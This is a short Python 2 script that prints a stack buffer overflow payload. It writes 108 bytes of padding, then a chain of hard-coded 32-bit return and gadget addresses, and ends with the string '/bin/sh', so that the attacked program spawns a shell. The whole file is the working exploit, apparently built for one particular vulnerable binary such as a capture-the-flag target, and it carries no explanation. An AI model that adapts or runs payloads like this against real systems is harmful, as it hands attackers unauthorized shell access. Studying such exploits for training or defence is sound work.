from struct import pack
print '\x01'*108+pack('<I',0xbffea810)+pack('<I',0x0806669a)+pack('<I',0xbffea77c)+pack('<I',0x080643e8)+'\x01'*8+pack('<I',0x0808ff7d)+pack('<I',0xbffea87c)+'\x01'*8+pack('<I',0xbffea87c)+pack('<I',0x08050bbc)+'\x01'*12+(pack('<I',0x41414141)+pack('<I',0x08050bbc))*10+pack('<I',0x41414141)+pack('<I',0x08055d70)+'/bin/sh'
